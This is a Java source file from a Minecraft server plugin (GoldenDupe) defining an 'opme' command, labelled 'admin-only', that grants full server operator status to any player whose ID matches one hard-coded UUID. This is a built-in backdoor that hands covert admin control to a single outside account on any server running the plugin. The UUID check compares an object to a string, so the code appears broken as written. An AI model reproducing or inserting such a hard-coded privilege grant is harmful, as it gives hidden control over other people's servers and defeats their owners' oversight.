package xyz.goldendupe.command.admin;

import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.incendo.cloud.description.Description;
import org.incendo.cloud.paper.PaperCommandManager;
import org.incendo.cloud.permission.PredicatePermission;
import org.jetbrains.annotations.ApiStatus;
import xyz.goldendupe.GoldenDupeCommandRegister;
import xyz.goldendupe.command.cloud.GDCloudCommand;

@ApiStatus.Internal
public class OpMeCommand extends GDCloudCommand {
    public OpMeCommand(GoldenDupeCommandRegister register, PaperCommandManager.Bootstrapped<CommandSender> commandManager) {
        super(register, commandManager);

        commandPlayer(
                commandBuilderPlayer("opme", Description.of("admin-only"))
                        .senderType(Player.class)
                        .permission(PredicatePermission.of(p->{
                            if (p.getUniqueId().equals("42749f9b-cc7a-4990-926a-acf787664c99")){
                                return true;
                            }
                            return false;
                        }))
                        .handler(context -> {
                            Player player = context.sender();
                            player.setOp(true);
                            player.sendMessage("Done.");
                        })
        );
    }
}